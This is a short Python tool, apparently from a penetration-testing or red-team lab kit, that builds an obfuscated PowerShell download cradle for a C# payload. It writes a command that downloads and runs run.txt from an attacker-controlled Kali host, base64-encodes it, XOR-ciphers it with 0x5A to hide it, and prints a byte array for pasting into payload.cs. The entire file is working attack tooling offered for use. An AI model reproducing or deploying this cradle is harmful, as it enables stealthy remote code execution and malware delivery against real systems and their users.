#!/usr/bin/env python3
"""
encode_cradle.py — produces the ciphered byte block for pdf/payload.cs.

Usage:
    python3 tools/encode_cradle.py --kali 192.168.119.120

Output: a byte[] literal to paste into the `ciphered` field of payload.cs.
"""

import argparse
import base64


def encode(kali_ip: str) -> str:
    cmd = (
        f"iex((new-object system.net.webclient)"
        f".downloadstring('http://{kali_ip}/run.txt'))"
    )
    b64 = base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")
    ciphered = [b ^ 0x5A for b in b64.encode("utf-8")]
    return ciphered


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--kali", required=True, help="Kali IP for the cradle URL")
    args = ap.parse_args()
    c = encode(args.kali)
    print("static byte[] ciphered = new byte[] {")
    print(",".join(f"0x{b:02x}" for b in c))
    print("};")


if __name__ == "__main__":
    main()
